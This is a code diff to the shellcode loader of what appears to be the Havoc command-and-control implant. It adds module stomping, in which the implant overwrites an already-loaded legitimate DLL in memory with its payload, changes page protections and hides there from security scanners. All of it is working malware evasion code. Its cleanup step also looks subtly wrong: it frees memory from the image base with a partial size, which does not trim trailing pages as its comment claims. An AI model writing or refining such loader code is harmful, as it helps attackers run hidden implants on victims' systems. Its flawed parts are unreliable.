@@ -8,6 +8,14 @@
 #define IMAGE_REL_TYPE IMAGE_REL_BASED_HIGHLOW
 #endif
 
+// markers the teamserver locates & patches in the shellcode template to enable
+// module stomping and set the decoy module name at build time.
+#define STOMP_TARGET_MARKER     L"HAVOC_STOMP_TARGET"
+#define STOMP_ENABLED_MARKER    0x0D
+
+SEC( text, B ) WCHAR gStompTarget[ STOMP_TARGET_LEN ] = STOMP_TARGET_MARKER;
+SEC( text, B ) BYTE  gStompEnabled                    = STOMP_ENABLED_MARKER;
+
 SEC( text, B ) VOID Entry( VOID )
 {
     INSTANCE                Instance        = { 0 };
@@ -23,21 +31,59 @@ SEC( text, B ) VOID Entry( VOID )
     ULONG                   OldProtection   = 0;
     PIMAGE_DATA_DIRECTORY   ImageDir        = NULL;
     KAYN_ARGS               KaynArgs        = { 0 };
+    BOOL                    Mapped          = FALSE;
+
+    LPVOID                  StompBase       = NULL;
+    SIZE_T                  StompSize       = 0;
+    PIMAGE_NT_HEADERS       StompNt         = NULL;
 
     // 0. First we need to get our own image base
     KaynLibraryLdr          = KaynCaller();
     Instance.Modules.Ntdll  = LoaderModPebbb( NTDLL_HASH );
 
     Instance.Win32.LdrLoadDll              = LoaderFuncAdd( Instance.Modules.Ntdll, SYS_LDRLOADDLL );
+    Instance.Win32.LdrGetDllHandle         = LoaderFuncAdd( Instance.Modules.Ntdll, SYS_LDRGETDLLHANDLE );
     Instance.Win32.NtAllocateVirtualMemory = LoaderFuncAdd( Instance.Modules.Ntdll, SYS_NTALLOCATEVIRTUALMEMORY );
     Instance.Win32.NtProtectVirtualMemory  = LoaderFuncAdd( Instance.Modules.Ntdll, SYS_NTPROTECTEDVIRTUALMEMORY );
+    Instance.Win32.NtFreeVirtualMemory     = LoaderFuncAdd( Instance.Modules.Ntdll, SYS_NTFREEVIRTUALMEMORY );
 
     NtHeaders = C_PTR( KaynLibraryLdr + ( ( PIMAGE_DOS_HEADER ) KaynLibraryLdr )->e_lfanew );
     SecHeader = IMAGE_FIRST_SECTION( NtHeaders );
     KHdrSize  = SecHeader[ 0 ].VirtualAddress;
     KMemSize  = NtHeaders->OptionalHeader.SizeOfImage - KHdrSize;
 
-    if ( NT_SUCCESS( Instance.Win32.NtAllocateVirtualMemory( NtCurrentProcess(), &KVirtualMemory, 0, &KMemSize, MEM_COMMIT, PAGE_READWRITE ) ) )
+    // Optional module stomping: overwrite a legitimate, already-loaded module
+    // image with our payload. enabled per-build by the teamserver (gStompEnabled).
+    if ( gStompEnabled == 1 )
+    {
+        U_STRING StompName = { 0 };
+
+        StompName.Buffer        = gStompTarget;
+        StompName.Length        = ( USHORT )( STOMP_TARGET_LEN - 1 ) * sizeof( WCHAR );
+        StompName.MaximumLength = ( USHORT )( STOMP_TARGET_LEN ) * sizeof( WCHAR );
+        if ( ! NT_SUCCESS( Instance.Win32.LdrGetDllHandle( NULL, NULL, &StompName, &StompBase ) ) )
+            Instance.Win32.LdrLoadDll( NULL, NULL, &StompName, &StompBase );
+
+        if ( StompBase )
+        {
+            StompNt   = C_PTR( StompBase + ( ( PIMAGE_DOS_HEADER ) StompBase )->e_lfanew );
+            StompSize = StompNt->OptionalHeader.SizeOfImage;
+
+            // only stomp if the target can hold the entire payload image
+            if ( StompSize >= NtHeaders->OptionalHeader.SizeOfImage )
+            {
+                KVirtualMemory = StompBase;
+                KHdrSize       = 0;
+                KMemSize       = NtHeaders->OptionalHeader.SizeOfImage;
+                Mapped         = TRUE;
+            }
+        }
+    }
+
+    if ( ! Mapped && NT_SUCCESS( Instance.Win32.NtAllocateVirtualMemory( NtCurrentProcess(), &KVirtualMemory, 0, &KMemSize, MEM_COMMIT, PAGE_READWRITE ) ) )
+        Mapped = TRUE;
+
+    if ( Mapped )
     {
         // TODO: find the base address of this shellcode in a better way?
         KaynArgs.KaynLdr   = ( PVOID ) ( ( ( ULONG_PTR )KaynLibraryLdr ) & ( ~ ( PAGE_SIZE - 1 ) ) );
@@ -47,6 +93,16 @@ SEC( text, B ) VOID Entry( VOID )
 
         for ( DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++ )
         {
+            // when stomping, the destination pages are not writable: flip them first
+            if ( gStompEnabled == 1 )
+            {
+                SecMemory     = C_PTR( KVirtualMemory + SecHeader[ i ].VirtualAddress );
+                SecMemorySize = SecHeader[ i ].SizeOfRawData;
+
+                if ( ! NT_SUCCESS( Instance.Win32.NtProtectVirtualMemory( NtCurrentProcess(), &SecMemory, &SecMemorySize, PAGE_READWRITE, &OldProtection ) ) )
+                    continue;
+            }
+
             MemCopy(
                 C_PTR( KVirtualMemory + SecHeader[ i ].VirtualAddress - KHdrSize ), // Section New Memory
                 C_PTR( KaynLibraryLdr + SecHeader[ i ].PointerToRawData ),          // Section Raw Data
@@ -91,6 +147,17 @@ SEC( text, B ) VOID Entry( VOID )
                 Protection = PAGE_EXECUTE_READWRITE;
 
             Instance.Win32.NtProtectVirtualMemory( NtCurrentProcess(), &SecMemory, &SecMemorySize, Protection, &OldProtection );
+        }
+
+        // when stomping: trim the decoy's trailing pages and restore RX over the image
+        if ( gStompEnabled == 1 )
+        {
+            if ( StompSize > NtHeaders->OptionalHeader.SizeOfImage )
+                Instance.Win32.NtFreeVirtualMemory( NtCurrentProcess(), &KVirtualMemory, &( SIZE_T ){ StompSize - NtHeaders->OptionalHeader.SizeOfImage }, MEM_RELEASE );
+
+            SecMemory     = KVirtualMemory;
+            SecMemorySize = NtHeaders->OptionalHeader.SizeOfImage;
+            Instance.Win32.NtProtectVirtualMemory( NtCurrentProcess(), &SecMemory, &SecMemorySize, PAGE_EXECUTE_READ, &OldProtection );
         }
 
         // --------------------------------
